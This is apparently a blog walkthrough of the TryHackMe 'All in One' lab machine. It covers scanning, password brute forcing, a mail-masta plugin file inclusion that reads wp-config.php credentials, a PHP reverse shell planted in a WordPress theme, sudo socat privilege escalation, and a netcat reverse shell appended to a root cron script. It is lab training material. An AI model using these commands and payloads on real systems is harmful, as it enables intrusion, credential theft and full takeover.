---
layout: post
title: TryHackMe Walkthrough - All in One
date: 2021-03-15
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Boot2Root
- Easy
- Machine
permalink: /2021/03/TryHackMe-Walkthrough-AllInOne/
---

This is my walkthrough of the [All in One room on TryHackMe](https://tryhackme.com/room/allinonemj). The description of the room says that there are multiple ways to exploit it. But I have to confess that I am lazy. So once I got root, I did not look for other ways in.

* Room: All in One
* Difficulty: Easy
* URL: https://tryhackme.com/room/allinonemj

## Scanning
The first thing to do is always to scan the machine for opened ports. 

```bash
nmap -A -oN nmap.txt target

Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 19:22 EDT
Nmap scan report for target (10.10.42.90)
Host is up (0.24s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION     
21/tcp open  ftp     vsftpd 3.0.3       
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:                               
|   STAT:                                    
| FTP server status:                      
|      Connected to ::ffff:10.13.3.36
|      Logged in as ftp                                                                                              
|      TYPE: ASCII
|      No session bandwidth limit                                                                                    
|      Session timeout in seconds is 300                                                                             
|      Control connection is plain text                                                                              
|      Data connections will be plain text         
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable         
|_End of status                                                                                                      
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                                       
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                                                  
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

There are 3 ports opened 21 (FTP), 22 (SSH) and 80 (HTTP). 

nmap flags that the FTP accepts anonymous connections, so I tried that first to see if there are anything that could help us there. 

```bash
ftp target
Connected to target.
220 (vsFTPd 3.0.3)
Name (target:ehogue): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06 11:57 .
drwxr-xr-x    2 0        115          4096 Oct 06 11:57 ..
226 Directory send OK.

ftp> put test
local: test remote: test
200 PORT command successful. Consider using PASV.
553 Could not create file.
```

The server is empty, and we cannot create a file. So this looks like a dead end for now. 

## Web Site

Before I start looking at the site, I launch GoBuster to look for hidden files/folders. 

Going to the web site only gives me the default Apache2 page. And there are no robots.txt file to help me. 

![Default Apache Page](/assets/images/2021/03/defaultApachePage.png "Default Apache Page"). 

By then, I had some results from the GoBuster scans.

```bash
gobuster dir -e -u http://target/ -t30 -w /usr/share/dirb/wordlists/common.txt | tee gobuster.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/03/14 19:34:33 Starting gobuster in directory enumeration mode
===============================================================
http://target/.htpasswd            (Status: 403) [Size: 271]
http://target/.htaccess            (Status: 403) [Size: 271]
http://target/.hta                 (Status: 403) [Size: 271]
http://target/index.html           (Status: 200) [Size: 10918]
http://target/server-status        (Status: 403) [Size: 271]  
http://target/wordpress            (Status: 301) [Size: 304] [--> http://target/wordpress/]
```

```bash
gobuster dir -e -u http://target/ -t30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster2.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/03/14 19:39:53 Starting gobuster in directory enumeration mode
===============================================================
http://target/wordpress            (Status: 301) [Size: 304] [--> http://target/wordpress/]
http://target/hackathons           (Status: 200) [Size: 197]                               k
http://target/server-status        (Status: 403) [Size: 271]                   
```

The http://target/hackathons page is a blank page with a useless message. 
```
Damn how much I hate the smell of Vinegar :/ !!!
```

But if you look at the source code, there are a bunch of white lines, and at the end two comments.

```html
<!-- Dvc SomethingThatLooksLikeAPassword --> 
<!-- KeepGoing -->
```
I'm not sure if that means anything. It might be a password. 

Going to http://target/wordpress/ give us a simple wordpress site. 

![Wordpress Site](/assets/images/2021/03/AllInOneWordpressSite.png "Wordpress Site"). 

The site is very small. I did not see anything of interest in it's content. There is an author called elyana.   I tried this as a username on the login page. And Wordpress is nice enough to confirm that it's a valid username. 

http://target/wordpress/wp-login.php

![Incorrect Password](/assets/images/2021/03/AllInOneIncorrectPassword.png "Incorrect Password"). 

I tried the strings found in the HTML comment as the password, but it failed. I decided to try brute forcing elyana's password.

In Wordpress:
```bash
wpscan --url http://target/wordpress/ names elyana --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

And in ssh:
```bash
hydra -l elyana -P /usr/share/wordlists/rockyou.txt -f -u -e snr -t4 target ssh
```

I left those 2 scripts running for a while. But they did not find the password. 

## Foot Hold

After having the 2 brute force attempts running for a while, I realized that the way in was probably not through a weak password. 

I went back and took a better look at the output of WPScan. 

```bash
[+] mail-masta
 | Location: http://target/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://target/wordpress/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://target/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://target/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2021-03-10T02:38:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://target/wordpress/wp-content/plugins/reflex-gallery/readme.txt
```

It identified 2 plugins. I search for the first one, mail-masta and found that it is [vulnerable to Local File Inclusion](https://www.exploit-db.com/exploits/40290). According to Exploit Database, there are multiple files in the plugin that include a file directly from the request. 

```php
include($_GET['pl']);
```

It's pretty easy to test. The following URL will load the /etc/passwd file in the browser:   http://target/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

From here, I tried loading the wp-config.php file. Trying to access it directly would not work because the PHP code is executed and not returned:  http://target/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/wordpress/wp-config.php

But with PHP filters, I can convert the file content to base64:  http://target/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php

I could then decode the returned base64 to the the PHP code.

```bash
echo -n "Base64 content on the page" | base64 -d
```

This gave me the username and password used to connect to the database. 
```php
/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'PASSWORD' );
```

The DB username is elyana. Maybe they reuse passwords. I tried the found passwords in the Wordpress site. It worked, and I was connected as an admin account.

With its Theme Editor, Wordpress allow administrators to modify theme files from the user interface. We can use this feature to inject PHP code that will be executed on the server. I used this to inject a PHP reverse shell in the 404 template. 

I went to the [404 Template in the Theme Editor](http://10.10.26.14/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty) (I had to use the IP in the URL, not the host name I created). I injected the reverse shell found in `/usr/share/webshells/php/php-reverse-shell.php` and made sure to change the $ip and $port variables. I then click on Update File to publish the changes. 

I started a netcat listener on my machine and navigated to a [page that doesn't exist](http://target/wordpress/index.php/aaa). I then got a connection in my netcat listener.

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.26.14 44278
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:23:32 up 22 min,  0 users,  load average: 0.02, 0.03, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data
```

## Escalate to Elyana
After I stabilized the shell, I started to look for ways to elevate my privileges because the user www-data is usually limited on what it can do on a Linux box. Looking at the `/home/` folder, there is a folder for elyana. It contains a flag file that we can't read, and a hint file. I decided to ignore the hint for now. To only read it if I coudn't find a way to the elyana user. 

I looked around the web site, tried `sudo -l` and look around a little, but did not see anything at first glance. 

I then looked for files that elyana might have left on the system. 

```bash
find / -user elyana 2>/dev/null 
/home/elyana
...
/etc/mysql/conf.d/private.txt

cat /etc/mysql/conf.d/private.txt
user: elyana
password: Password
```

I use the password to run `su elyana` and I was now connected as elyana. 

```bash
bash-4.4$ su elyana 
Password: 

bash-4.4$ whoami
elyana

bash-4.4$ cat /home/elyana/user.txt
base64 Flag

bash-4.4$ cat /home/elyana/user.txt | base64 -d
THM{The User Flag}
```

## Escalate to root

The last step is to get the root flag. I looked if elyana could run sudo. And they where allowed to run socat as anyone. 

```bash
sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat
```

I looked at GTFOBins and [socat can be used to elevate privileges](https://gtfobins.github.io/gtfobins/socat/#sudo). 

```bash
sudo socat stdin exec:/bin/sh

whoami
root

cat /root/root.txt
base64 Flag

cat /root/root.txt | base64 -d
THM{The Root Flag}
```

## Alternative Path

While writing this post, I was looking around the server and found another way to root it directly from www-data. You don't even need to pass by elyana's user. 

Once you get the shell as www-data, you can see a crontab that runs every minutes as root.

```bash
cat /etc/crontab 

...

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
...
*  *    * * *   root    /var/backups/script.sh


ls -l /var/backups/script.sh 
-rwxrwxrwx 1 root root 73 Oct  7 13:37 /var/backups/script.sh

cat /var/backups/script.sh
#!/bin/bash

#Just a test script, might use it later to for a cron task
```

The file is writable be everyone. So we can inject a bash reverse shell in it and get a root shell back. 

```bash
echo "mkfifo /tmp/kirxhbg; nc 10.13.3.36 4445 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg" >> /var/backups/script.sh
```

Start another netcat listener and wait for the connection. You'll get a root shell directly, so you can get both flags.

```bash
nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.35.108 47790

whoami
root

cat /home/elyana/user.txt | base64 -d
THM{The User Flag}

cat /root/root.txt | base64 -d
THM{The root Flag}
```

